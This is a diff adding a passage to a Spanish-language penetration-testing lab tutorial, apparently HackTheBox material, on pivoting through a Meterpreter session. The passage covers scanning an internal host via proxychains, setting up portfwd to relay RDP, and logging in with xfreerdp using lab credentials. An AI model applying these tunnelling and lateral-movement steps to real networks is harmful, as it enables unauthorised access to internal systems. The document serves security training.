@@ -147,3 +147,71 @@ Active Routing Table
 ```
 
 Como puede ver en el resultado anterior, la ruta se agregó a la red 172.16.5.0/23. Ahora podremos usar cadenas proxy para enrutar nuestro tráfico de Nmap a través de nuestra sesión de Meterpreter.
+
+#### Prueba de funcionalidad de enrutamiento y proxy
+
+Túneles y reenvío de puertos de Meterpreter
+
+```python
+G41i130Q@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
+Initiating Parallel DNS resolution of 1 host. at 13:40
+Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
+Initiating Connect Scan at 13:40
+Scanning 172.16.5.19 [1 port]
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
+Discovered open port 3389/tcp on 172.16.5.19
+Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
+Nmap scan report for 172.16.5.19 
+Host is up (0.12s latency).
+
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
+```
+
+#### Opciones de puerto
+
+Túneles y reenvío de puertos de Meterpreter
+
+```
+meterpreter > help portfwd
+
+Usage: portfwd [-h] [add | delete | list | flush] [args]
+
+
+OPTIONS:
+
+    -h        Help banner.
+    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
+    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
+    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
+    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
+    -r <opt>  Forward: remote host to connect to.
+    -R        Indicates a reverse port forward.
+```
+
+#### Creación de retransmisión TCP local
+
+Túneles y reenvío de puertos de Meterpreter
+
+```shell-session
+meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
+
+[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
+```
+
+El comando anterior solicita a la sesión de Meterpreter que inicie un detector en el puerto local de nuestro host de ataque ( `-l`) `3300` y reenviar todos los paquetes al control remoto ( `-r`) Servidor de windows `172.16.5.19` en `3389` puerto ( `-p`) a través de nuestra sesión de Meterpreter. Ahora, si ejecutamos xfreerdp en nuestro localhost:3300, podremos crear una sesión de escritorio remoto.
+
+#### Conexión a Windows Target a través de localhost
+
+Túneles y reenvío de puertos de Meterpreter
+
+```shell-session
+G41i130Q@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+```
